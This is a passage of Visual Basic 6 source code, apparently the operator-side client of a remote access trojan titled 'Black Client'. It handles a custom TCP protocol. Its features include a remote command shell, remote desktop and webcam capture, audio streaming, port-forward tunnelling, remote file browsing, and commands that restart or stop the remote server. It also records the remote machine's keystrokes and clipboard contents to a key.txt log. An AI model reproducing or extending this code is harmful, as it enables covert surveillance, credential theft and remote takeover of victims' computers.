                            BMPNow(i) = dataBytes(j)
                            BMPNow(i + 1) = dataBytes(j + 1)
                            BMPNow(i + 2) = dataBytes(j + 2)
                            j = j + 3
                            i = i + 3
                        Next k
                    Else
                        For k = 1 To m
                            BMPNow(i) = dataBytes(j + 1)
                            BMPNow(i + 1) = dataBytes(j + 2)
                            BMPNow(i + 2) = dataBytes(j + 3)
                            i = i + 3
                        Next k
                        j = j + 4
                    End If
                Loop
                desktopTransLen = desktopTransLen + UBound(dataBytes) + 1
            End If
            SendData ChrB(43)
        End If
    
    ElseIf key = 44 Then
        If desktoping = True And imageType = 0 Then
            desktoping = False
            BMPShow.Enabled = False
            BMPShow_Timer
            DesktopDelay.Enabled = True
            Desktop.Text1.ToolTipText = desktopTransLen \ 1024 & "K"
            Desktop.Picture2.ToolTipText = desktopTransLen \ 1024 & "K"
        End If
    
     'tunnel connect
    ElseIf key = 50 Then
        If tunnelMode = True Then TCP.Connect 1
    
    'tunnel connected
    ElseIf key = 51 Then
        If tunnelMode = True Then
            tunnelConnected = True
            If tunnelData <> vbNullString Then
                SendData ChrB(59), tunnelData
                tunnelData = vbNullString
            End If
        End If
    
    ElseIf key = 48 Then
        tunnelMode = True
        If tunnelListen = True Then TCP.Listen 1
        Forward.Label5.Caption = "Disable"
        Forward.Label5.Visible = True
        Forward.Shape1.Visible = True
        
    ElseIf key = 49 Then
        tunnelMode = False
        Forward.Label5.Caption = "Enable"
        Forward.Label5.Visible = True
        Forward.Shape1.Visible = True
        Forward.Text1.Locked = False
        Forward.Text2.Locked = False
        Forward.Text3.Locked = False
        Forward.Option1.Enabled = True
        Forward.Option2.Enabled = True
        MessageBox Forward.hwnd, IIf(hasData, CStr(dataBytes), "Unknow error!"), "Forward Faild", vbOKOnly
    
    ElseIf key = 59 Then
        If hasData And tunnelMode = True Then TCP.SendData 1, dataBytes
    
    ElseIf key = 60 Then
        If tunnelMode = True Then
            TCP.CloseSck 1
            If tunnelListen = True Then TCP.Listen 1
            tunnelConnected = False
            tunnelData = vbNullString
        End If
            
    ElseIf key = 55 Then
        If globalHooking = True Then
            i = CLng(head(2)) * 256 + head(3)
            If miniDesktop = True Then i = i \ 4
            Desktop.Shape1.Left = i * Screen.TwipsPerPixelX - 75
            i = CLng(head(4)) * 256 + head(5)
            If miniDesktop = True Then i = i \ 4
            Desktop.Shape1.Top = i * Screen.TwipsPerPixelY - 75
            If head(6) = 3 Then
                Desktop.Shape1.FillColor = &HFF&
                Desktop.Shape1.FillStyle = 0
            ElseIf head(6) = 6 Then
                Desktop.Shape1.FillColor = &HFF00&
                Desktop.Shape1.FillStyle = 0
            ElseIf head(6) = 9 Then
                Desktop.Shape1.FillColor = &HFFFF&
                Desktop.Shape1.FillStyle = 0
            Else
                Desktop.Shape1.FillStyle = 1
            End If
            If head(1) = 0 Then
                KeyReader.Enabled = True
            Else
                returnKey head(1)
                SendData ChrB(56)
            End If
        End If
    
    'wave error
    ElseIf key = 66 Then
        WaveOutDeinit
        Mvoiceon.Enabled = True
        Mbuffer.Enabled = True
        
    'wave data
    ElseIf key = 68 Then
        If waveReady = True Then
            If waveSendFinish = True And hasData Then
                ReDim extraBuf(UBound(dataBytes))
                CopyMemory extraBuf(0), dataBytes(0), UBound(extraBuf) + 1
                extraUsed = True
            Else
                If hasData And wavePos + UBound(dataBytes) <= UBound(waveData) Then
                    CopyMemory waveData(wavePos), dataBytes(0), UBound(dataBytes) + 1
                    wavePos = wavePos + UBound(dataBytes) + 1
                End If
                SendData ChrB(69)
            End If
        End If
    
    'wave finish
    ElseIf key = 70 Then
        If waveReady = True And waveSendFinish = False Then
            If wavePlayFinish = False Then
                waveSendFinish = True
            Else
                CopyMemory ByVal outHdr.lpData, waveData(0), BUF_SIZE
                wavePos = 0
                WaveOutPlayback
            End If
        End If
    
    'mixer data
    ElseIf key = 72 Then
        If head(1) = 1 Then
            mixerList = ""
            Options.Combo1.Clear
        End If
        If hasData Then mixerList = mixerList + CStr(dataBytes)
        dealMixerList
        SendData ChrB(73)
    
    'camera reply
    ElseIf key = 77 Then
        If globalCameraing = True And cameraing = False Then
            cameraTransLen = 0
            cameraing = True
            cameraPos = 0
            Camera.Picture1.width = (CLng(head(1)) * 256 + head(2)) * Screen.TwipsPerPixelX
            Camera.Picture1.Height = (CLng(head(3)) * 256 + head(4)) * Screen.TwipsPerPixelY
            Camera.Form_Resize
            Camera.Label4.Caption = ""
            If hasData Then Camera.Label4.Caption = CStr(dataBytes)
            If Camera.Visible = False Then Camera.Form_Show
            SendData ChrB(79)
        End If
    
    'camera data
    ElseIf key = 78 Then
        If cameraing = True Then
            If hasData Then
                ReDim Preserve cameraData(cameraPos + UBound(dataBytes))
                CopyMemory cameraData(cameraPos), dataBytes(0), UBound(dataBytes) + 1
                cameraPos = cameraPos + UBound(dataBytes) + 1
                cameraTransLen = cameraTransLen + UBound(dataBytes) + 1
            End If
            SendData ChrB(79)
        End If
    
    'camera finish
    ElseIf key = 80 Then
        If cameraing = True Then
            cameraing = False
            drawCamera
            If cameraShot = False Then CameraDelay.Enabled = True
            Camera.Picture2.ToolTipText = cameraTransLen \ 1024 & "K"
        End If
        
    'camera error
    ElseIf key = 84 Then
        globalCameraing = False
        cameraing = False
        cameraMenuShow
    
    'clipboard data
    ElseIf key = 86 Then
        If hasData Then
            Dim clipboard As String
            clipboard = "{" & CStr(dataBytes) & "}"
            If globalHooking = True Then
                Print #3, clipboard; '; means do not print a new line
                If Len(Desktop.Text1.Text) > 2048 Then Desktop.Text1.Text = Right(Desktop.Text1.Text, 1024)
                Desktop.Text1.Text = Desktop.Text1.Text & " " & clipboard
                Desktop.Text1.SelStart = Len(Desktop.Text1.Text)
            Else
                MessageBox Desktop.hwnd, clipboard, "Clipboard", vbOKOnly
            End If
        End If
    
    
    Else
        'nothing
    End If
    'retreat
    If dataLeft = True Then
        dataBytes = leftBytes
        DataCenter
    End If
End Sub

Public Sub tunnelDisable()
    On Error Resume Next
    TCP.CloseSck 1
    SendData ChrB(61)
    tunnelConnected = False
    tunnelMode = False
    tunnelData = vbNullString
End Sub

Private Sub TCP_ConnectionRequest(ByVal Index As Variant, ByVal requestID As Long)
    On Error Resume Next
    If Index = 1 Then
        SendData ChrB(50)
        TCP.CloseSck 1
        TCP.Accept 1, requestID
    ElseIf Index = 3 Then
        SendDataA ChrB(5)
        TCP.CloseSck 3
        TCP.Accept 3, requestID
    End If
End Sub

Private Sub Mconnect_Click()
    On Error Resume Next
    IP.Show , Client 'connect to a server
End Sub

Private Sub Mdisconnect_Click()
    On Error Resume Next
    'tell the server to disconect
    SendData ChrB(18)
End Sub

Private Sub Mrestartserver_Click()
    On Error Resume Next
    'tell the server to restart
    SendData ChrB(64)
End Sub

Private Sub Mstopserver_Click()
    On Error Resume Next
    'tell the server to end
    SendData ChrB(19)
End Sub

Private Sub Mopencmd_Click()
    On Error Resume Next
    SendData ChrB(15)
End Sub

Private Sub Mclosecmd_Click()
    On Error Resume Next
    globalCmding = False
    SendData ChrB(17)
    Text2.Text = ""
    Text2.Locked = True
    CmdReader.Enabled = False
End Sub

Private Sub TCP_Error(ByVal Index As Variant, ByVal Number As Integer, Description As String, ByVal sCode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    On Error Resume Next
    TCP_CloseSck Index
End Sub

Private Sub Text2_KeyPress(KeyAscii As Integer)
    On Error Resume Next
    'should not deal it when cmd is closed
    If Text2.Locked = True Then Exit Sub
    'ignore anykey except enter
    If KeyAscii <> 13 Then Exit Sub
    If LCase(Text2.Text) = "cls" Then
        Text1.Text = ""
    End If
    'send the command to server
    SendData ChrB(1), Text2.Text + vbNewLine
    Text2.Text = ""
    KeyAscii = 0 'cancel the input of enter
End Sub

Private Sub Mshell_Click()
    On Error Resume Next
    VbShell.Show , Client
End Sub

Private Sub Mtunnel_Click()
    On Error Resume Next
    Forward.Show , Client
End Sub

Public Sub Mhookoff_Click()
    On Error Resume Next
    globalHooking = False
    SendData ChrB(54)
    KeyReader.Enabled = False
    Desktop.Shape1.Visible = False
    Desktop.Text1.Text = ""
    Desktop.Label3.Visible = False
    Close #3
End Sub

Public Sub Mhookon_Click()
    On Error Resume Next
    globalHooking = True
    SendData ChrB(53)
    KeyReader.Enabled = True
    Desktop.Shape1.Visible = True
    If Desktop.Label3.Visible = False Then
        Desktop.Label3.Caption = "M"
        Desktop.Label3.ForeColor = &HFF&
        Desktop.Label3.BackColor = &H0&
        Desktop.Label3.Visible = True
    End If
    Close #3
    Open "key.txt" For Append As #3
    Print #3, vbNewLine + vbNewLine + CStr(Now)
End Sub

Public Sub Mkidoff_Click()
    On Error Resume Next
    SendData ChrB(58)
    Mhook.Enabled = True
    Desktop.Label3.Visible = False
End Sub

Private Sub Mkidon_Click()
    On Error Resume Next
    SendData ChrB(57)
    KeyReader.Enabled = False
    Desktop.Shape1.Visible = False
    Desktop.Text1.Text = ""
    Mhook.Enabled = False
    Desktop.Label3.Caption = "H"
    Desktop.Label3.ForeColor = &HFFFFFF
    Desktop.Label3.BackColor = &HFF&
    Desktop.Label3.Visible = True
    Close #3
End Sub

Private Sub Moption_Click()
    On Error Resume Next
    Options.Show , Client
End Sub

Private Sub Mabout_Click()
    On Error Resume Next
    Help.Show , Client
End Sub

Private Sub Mexplorer_Click()
    On Error Resume Next
    Explorer.Show , Client
End Sub

Private Sub Moriginal_Click()
    On Error Resume Next
    If globalDesktoping = True Then Exit Sub
    globalDesktoping = True
    miniDesktop = False
    SendData ChrB(21) + ChrB(0) + ChrB(1)
    desktopMenuHide
End Sub

Private Sub Msmall_Click()
    On Error Resume Next
    If globalDesktoping = True Then Exit Sub
    globalDesktoping = True
    miniDesktop = True
    SendData ChrB(21) + ChrB(1) + ChrB(1)
    desktopMenuHide
End Sub

Private Sub Mcameraoriginal_Click()
    On Error Resume Next
    If globalCameraing = True Then Exit Sub
    globalCameraing = True
    cameraShot = False
    miniCamera = False
    SendData ChrB(76) + ChrB(0) + ChrB(1)
    cameraMenuHide
End Sub

Private Sub Mcamerasmall_Click()
    On Error Resume Next
    If globalCameraing = True Then Exit Sub
    globalCameraing = True
    cameraShot = False
    miniCamera = True
    SendData ChrB(76) + ChrB(1) + ChrB(1)
    cameraMenuHide
End Sub

Private Sub Mcamerashot_Click()
    On Error Resume Next
    If globalCameraing = True Then Exit Sub
    globalCameraing = True
    cameraShot = True
    SendData ChrB(76) + ChrB(0) + ChrB(2)
    cameraMenuHide
End Sub

Public Sub cameraMenuShow()
    On Error Resume Next
    Mcamerashot.Enabled = True
    Mcameralive.Enabled = True
End Sub

Public Sub cameraMenuHide()
    On Error Resume Next
    Mcamerashot.Enabled = False
    Mcameralive.Enabled = False
End Sub

Public Sub desktopMenuShow()
    On Error Resume Next
    Moriginal.Enabled = True
    Msmall.Enabled = True
    Mcompress.Enabled = True
End Sub

Public Sub desktopMenuHide()
    On Error Resume Next
    Moriginal.Enabled = False
    Msmall.Enabled = False
    Mcompress.Enabled = False
End Sub

Private Sub Mbmp_Click()
    On Error Resume Next
    If globalDesktoping = True Then Exit Sub
    SendData ChrB(41) + ChrB(0)
End Sub

Private Sub Mgif_Click()
    On Error Resume Next
    If globalDesktoping = True Then Exit Sub
    SendData ChrB(41) + ChrB(1)
End Sub

Private Sub Mjpg_Click()
    On Error Resume Next
    If globalDesktoping = True Then Exit Sub
    SendData ChrB(41) + ChrB(2)
End Sub

Public Sub Meventoff_Click()
    On Error Resume Next
    sendEvent = False
    Focuser.Enabled = False
    UnHook
    Desktop.Label2.Caption = "Desktop"
    Desktop.Label2.BackColor = &H0&
End Sub

Private Sub Meventon_Click()
    On Error Resume Next
    sendEvent = True
    Focuser.Enabled = True
    Desktop.Label2.Caption = "On Air"
    Desktop.Label2.BackColor = &HFF&
End Sub

Private Sub Mvoicehigh_Click()
    On Error Resume Next
    If waveReady = True Then Exit Sub
    BUF_SIZE = BUF_SIZE_ONE * bufsec * 2
    WaveOutInit CHANNEL, SAMPLES, 16
    If waveReady = True Then
        SendData ChrB(65) + ChrB(1)
        Mvoiceon.Enabled = False
        Mbuffer.Enabled = False
    End If
End Sub

Private Sub Mvoicelow_Click()
    On Error Resume Next
    If waveReady = True Then Exit Sub
    BUF_SIZE = BUF_SIZE_ONE * bufsec
    WaveOutInit CHANNEL, SAMPLES, 8
    If waveReady = True Then
        SendData ChrB(65)
        Mvoiceon.Enabled = False
        Mbuffer.Enabled = False
    End If
End Sub

Private Sub Mvoiceoff_Click()
    On Error Resume Next
    WaveOutDeinit
    SendData ChrB(67)
    Mvoiceon.Enabled = True
    Mbuffer.Enabled = True
End Sub

Private Sub Mbuffer1_Click()
    On Error Resume Next
    If waveReady = True Then Exit Sub
    SendData ChrB(75) + ChrB(1)
    bufsec = 1
End Sub

Private Sub Mbuffer2_Click()
    On Error Resume Next
    If waveReady = True Then Exit Sub
    SendData ChrB(75) + ChrB(2)
    bufsec = 2
End Sub

Private Sub Mbuffer5_Click()
    On Error Resume Next
    If waveReady = True Then Exit Sub
    SendData ChrB(75) + ChrB(5)
    bufsec = 5
End Sub

Private Sub Label1_Click()
    On Error Resume Next
    Label2.Caption = " Black Client"
End Sub

Private Sub Label2_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
    On Error Resume Next
    ReleaseCapture
    SendMessage hwnd, &HA1, 2, ByVal 0&
End Sub

Private Sub Label2_DblClick()
    On Error Resume Next
    Client.WindowState = 1
End Sub

Private Sub Label3_Click()
    On Error Resume Next
    'tell the server to disconect
    SendData ChrB(18)
    PreEnd
    End
End Sub

Private Sub dealMixerList()
    On Error Resume Next
    Dim i As Long
    i = InStr(1, mixerList, Chr(0))
    Do While i > 0
        Options.Combo1.AddItem Left(mixerList, i - 1)
        mixerList = RightB(mixerList, LenB(mixerList) - i * 2)
        i = InStr(1, mixerList, Chr(0))
    Loop
End Sub

Private Sub dealDriveList()
    On Error Resume Next
    Dim i As Long
    i = InStr(1, driveList, Chr(0))
    Do While i > 0
        Explorer.Combo1.AddItem Left(driveList, i - 1)
        driveList = RightB(driveList, LenB(driveList) - i * 2)
        i = InStr(1, driveList, Chr(0))
    Loop
End Sub

Private Sub dealDirList()
    On Error Resume Next
    Dim i As Long
    i = InStr(1, dirList, Chr(0))
    Do While i > 0
        Explorer.List1.AddItem Left(dirList, i - 1)
        dirList = RightB(dirList, LenB(dirList) - i * 2)
        i = InStr(1, dirList, Chr(0))
    Loop
End Sub

Private Sub dealFileList()
    On Error Resume Next
    Dim i As Long
    i = InStr(1, fileList, Chr(0))
    Do While i > 0
        Explorer.List2.AddItem Left(fileList, i - 1)
        fileList = RightB(fileList, LenB(fileList) - i * 2)
        i = InStr(1, fileList, Chr(0))
    Loop
End Sub

Public Sub SendData(ByRef head As String, Optional ByRef data As String = vbNullString)
    On Error Resume Next
    Dim toSend() As Byte
    Dim dataLen As Long
    dataLen = 2 + headLen + LenB(data)
    ReDim toSend(dataLen - 1)
    toSend(0) = dataLen \ 256
    toSend(1) = dataLen Mod 256
    CopyMemory toSend(2), ByVal StrPtr(makeHead(head)), headLen
    If LenB(data) > 0 Then CopyMemory toSend(2 + headLen), ByVal StrPtr(data), LenB(data)
    TCP.SendData 0, toSend
End Sub

Public Sub SendDataA(ByRef head As String, Optional ByRef data As String = vbNullString)
    On Error Resume Next
    Dim toSend() As Byte
    Dim dataLen As Long
    dataLen = 2 + headLen + LenB(data)
    ReDim toSend(dataLen - 1)
    toSend(0) = dataLen \ 256
    toSend(1) = dataLen Mod 256
    CopyMemory toSend(2), ByVal StrPtr(makeHead(head)), headLen
    If LenB(data) > 0 Then CopyMemory toSend(2 + headLen), ByVal StrPtr(data), LenB(data)
    TCP.SendData 2, toSend
End Sub

Private Sub drawCamera()
    On Error Resume Next
    Dim pic As StdPicture
    Set pic = ArrayToPicture(cameraData)
    If Not pic Is Nothing Then Camera.Picture1.PaintPicture pic, 0, 0, Camera.Picture1.width, Camera.Picture1.Height, 0, 0, Camera.Picture1.width, Camera.Picture1.Height
End Sub

Private Sub drawPicture()
    On Error Resume Next
    Dim pic As StdPicture
    Set pic = ArrayToPicture(jpgData)
    If Not pic Is Nothing Then Desktop.Picture1.PaintPicture pic, imageLeft * Screen.TwipsPerPixelX, imageTop * Screen.TwipsPerPixelY, imageWidth * Screen.TwipsPerPixelX, imageHeight * Screen.TwipsPerPixelY, 0, 0, imageWidth * Screen.TwipsPerPixelX, imageHeight * Screen.TwipsPerPixelY
End Sub

Public Sub CameraDelay_Timer()
    On Error Resume Next
    CameraDelay.Enabled = False
    If globalCameraing = False Then Exit Sub
    If miniCamera = False Then
        SendData ChrB(76) + ChrB(0)
    Else
        SendData ChrB(76) + ChrB(1)
    End If
End Sub

Public Sub DesktopDelay_Timer()
    On Error Resume Next
    DesktopDelay.Enabled = False
    If globalDesktoping = False Then Exit Sub
    If miniDesktop = False Then
        SendData ChrB(21) + ChrB(0)
    Else
        SendData ChrB(21) + ChrB(1)
    End If
End Sub

Private Sub BMPShow_Timer()
    On Error Resume Next
    If globalDesktoping = False Then
        BMPShow.Enabled = False
        Exit Sub
    End If
    Dim pbag As PropertyBag
    Set pbag = New PropertyBag
    pbag.Contents = BMPNow
    Dim pic As StdPicture
    Set pic = pbag.ReadProperty("BMP")
    If Not pic Is Nothing Then Desktop.Picture1.PaintPicture pic, 0, 0, Desktop.Picture1.width, Desktop.Picture1.Height, 0, 0, Desktop.Picture1.width, Desktop.Picture1.Height
    Set pbag = Nothing
End Sub

Private Sub returnKey(ByVal KeyCode As Long)
    On Error Resume Next
    If KeyCode = 0 Then Exit Sub
    Dim key As String
    If KeyCode >= 65 And KeyCode <= 90 Then
        key = LCase(Chr(KeyCode))
    ElseIf KeyCode >= 48 And KeyCode <= 57 Then
        key = Chr(KeyCode)
    ElseIf KeyCode = 32 Then
        key = "[Space]"
    ElseIf KeyCode = 13 Then
        key = "[Enter]"
    ElseIf KeyCode = 162 Then
        key = "[lCtrl]"
    ElseIf KeyCode = 163 Then
        key = "[rCtrl]"
    ElseIf KeyCode = 160 Then
        key = "[lShift]"
    ElseIf KeyCode = 161 Then
        key = "[rShift]"
    ElseIf KeyCode = 164 Then
        key = "[lAlt]"
    ElseIf KeyCode = 165 Then
        key = "[rAlt]"
    ElseIf KeyCode = 9 Then
        key = "[Tab]"
    ElseIf KeyCode = 8 Then
        key = "[Back]"
    ElseIf KeyCode = 27 Then
        key = "[Esc]"
    ElseIf KeyCode = 20 Then
        key = "[CapsLk]"
    ElseIf KeyCode = 192 Then
        key = "`"
    ElseIf KeyCode = 91 Then
        key = "[lWin]"
    ElseIf KeyCode = 92 Then
        key = "[rWin]"
    ElseIf KeyCode = 93 Then
        key = "[rMouse]"
    ElseIf KeyCode >= 112 And KeyCode <= 135 Then
        key = "[F" + CStr(KeyCode - 111) + "]"
    ElseIf KeyCode = 188 Then
        key = ","
    ElseIf KeyCode = 190 Then
        key = "."
    ElseIf KeyCode = 191 Then
        key = "/"
    ElseIf KeyCode = 186 Then
        key = ";"
    ElseIf KeyCode = 222 Then
        key = "'"
    ElseIf KeyCode = 219 Then
        key = "["
    ElseIf KeyCode = 221 Then
        key = "]"
    ElseIf KeyCode = 220 Then
        key = "\"
    ElseIf KeyCode = 189 Then
        key = "-"
    ElseIf KeyCode = 187 Then
        key = "="
    ElseIf KeyCode = 44 Then
        key = "[PrtSc]"
    ElseIf KeyCode = 144 Then
        key = "[NumLk]"
    ElseIf KeyCode = 145 Then
        key = "[ScrLk]"
    ElseIf KeyCode = 19 Then
        key = "[Pause]"
    ElseIf KeyCode = 45 Then
        key = "[Ins]"
    ElseIf KeyCode = 46 Then
        key = "[Del]"
    ElseIf KeyCode = 36 Then
        key = "[Home]"
    ElseIf KeyCode = 35 Then
        key = "[End]"
    ElseIf KeyCode = 33 Then
        key = "[PgUp]"
    ElseIf KeyCode = 34 Then
        key = "[PgDn]"
    ElseIf KeyCode = 38 Then
        key = "[Up]"
    ElseIf KeyCode = 40 Then
        key = "[Down]"
    ElseIf KeyCode = 37 Then
        key = "[Left]"
    ElseIf KeyCode = 39 Then
        key = "[Right]"
    ElseIf KeyCode = 166 Then
        key = "[BBack]"
    ElseIf KeyCode = 167 Then
        key = "[BFwd]"
    ElseIf KeyCode = 16 Then
        key = "[Shift]"
    ElseIf KeyCode = 17 Then
        key = "[Ctrl]"
    ElseIf KeyCode = 18 Then
        key = "[Alt]"
    ElseIf KeyCode = 95 Then
        key = "[Sleep]"
    ElseIf KeyCode = 111 Then
        key = "[/]"
    ElseIf KeyCode = 106 Then
        key = "[*]"
    ElseIf KeyCode = 109 Then
        key = "[-]"
    ElseIf KeyCode = 107 Then
        key = "[+]"
    ElseIf KeyCode = 12 Then
        key = "[Clr]"
    ElseIf KeyCode >= 96 And KeyCode <= 105 Then
        key = "[Num" + CStr(KeyCode - 96) + "]"
    ElseIf KeyCode = 110 Then
        key = "[.]"
    ElseIf KeyCode = 41 Then
        key = "[Select]"
    ElseIf KeyCode = 42 Then
        key = "[Print]"
    ElseIf KeyCode = 43 Then
        key = "[Exe]"
    ElseIf KeyCode = 47 Then
        key = "[Help]"
    ElseIf KeyCode = 246 Then
        key = "[Attn]"
    ElseIf KeyCode = 247 Then
        key = "[Crsel]"
    ElseIf KeyCode = 248 Then
        key = "[Exsel]"
    ElseIf KeyCode = 249 Then
        key = "[ErEof]"
    ElseIf KeyCode = 250 Then
        key = "[Play]"
    ElseIf KeyCode = 251 Then
        key = "[Zoom]"
    ElseIf KeyCode = 252 Then
        key = "[NoName]"
    ElseIf KeyCode = 253 Then
        key = "[Pa1]"
    ElseIf KeyCode = 254 Then
        key = "[OemClr]"
    ElseIf KeyCode = 108 Then
        key = "[Separator]"
    ElseIf KeyCode = 3 Then
        key = "[Cancel]"
    ElseIf KeyCode = 255 Then
        key = "[Fn]"
    Else
        key = "[" & CStr(KeyCode) & "]"
    End If
    Print #3, key; '; means do not print a new line
    If Len(Desktop.Text1.Text) > 2048 Then Desktop.Text1.Text = Right(Desktop.Text1.Text, 1024)
    Desktop.Text1.Text = Desktop.Text1.Text & " " & key
    Desktop.Text1.SelStart = Len(Desktop.Text1.Text)
End Sub

Public Sub eraseDesktop()
    On Error Resume Next
    Erase BMPNow
    Erase jpgData
End Sub

Public Sub eraseCamera()
    On Error Resume Next
    Erase cameraData
End Sub
